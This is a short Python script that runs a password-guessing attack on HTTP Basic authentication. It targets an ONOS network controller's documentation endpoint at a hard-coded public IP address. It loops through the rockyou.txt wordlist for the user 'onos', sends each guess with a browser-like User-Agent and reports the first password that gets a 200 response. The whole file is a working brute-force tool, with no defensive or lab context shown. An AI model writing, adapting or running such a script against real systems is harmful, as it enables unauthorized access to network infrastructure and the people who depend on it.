import base64
import requests

url = "http://34.139.11.27:8181/onos/v1/docs/index.html"
username = "onos"
wordlist_path = './wordlists/rockyou.txt'

def encode_credentials(username:str, password:str):
    credentials =  f"{username}:{password}"
    return base64.b64encode(credentials.encode('ISO-8859-1')).decode("ISO-8859-1")

with open(wordlist_path, 'r', encoding='ISO-8859-1') as wordlist:
    for password in wordlist: 
            password = password.strip()
            encoded_credentials = encode_credentials(username, password)
            headers = {
                 "Authorization": f'Basic {encoded_credentials}',
                 "User-Agent": "Mozilla/5.0",
            }

            response = requests.get(url, headers=headers)

            if(response.status_code == 200):
                 print(f'Password Found: {password}')
                 break
            else:
                print(f"Unsuccessful atempt with password: '{password}'")